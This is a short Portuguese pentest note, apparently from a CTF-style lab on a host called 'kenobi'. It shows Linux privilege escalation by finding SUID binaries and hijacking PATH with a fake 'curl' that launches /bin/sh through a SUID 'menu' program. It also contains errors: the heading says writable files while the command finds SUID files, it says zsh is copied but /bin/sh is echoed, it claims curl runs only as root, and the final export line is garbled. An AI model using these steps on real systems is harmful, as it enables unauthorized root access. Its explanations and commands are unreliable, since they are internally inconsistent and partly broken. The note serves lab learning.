---
{"dg-publish":true,"permalink":"/pentest/priv-escalation/achar-arquivos-que-tem-permissoes-de-serem-escritos/"}
---

## Achar arquivos que tem permissões de serem escritos

```shell
find / -perm -u=s -type f 2>/dev/null
```

Foi achado o arquivo menu, sendo assim, o menu tem 3 opções.

1. Status check
2. Kernel version
3. ifconfig

- Por que isto é importante?
	- Quando você usa um comando como o "`status check`", basicamente você precisa de um programa pra rodar ele. O usuário final não necessita saber, porém este programa é chamado `curl`
	- ![](https://i.imgur.com/1xMRzfl.png)  


Sendo assim podemos manipular o estado do `curl`, afinal ele só roda se tivermos privilegios root, então porquê ele está rodando? Alguém dentro do servidor manipulou ele para liberar acesso a algum outro usuário, portanto podemos utilizar isso ao nosso favor.

- Vamos copiar a `zsh` do linux, nomea-la `curl` e mandar ela para `/tmp`
- Mudar a permissão dela para 777 com: `chmod 777 curl`:
```shell
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl 
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH/user/bin/menu
```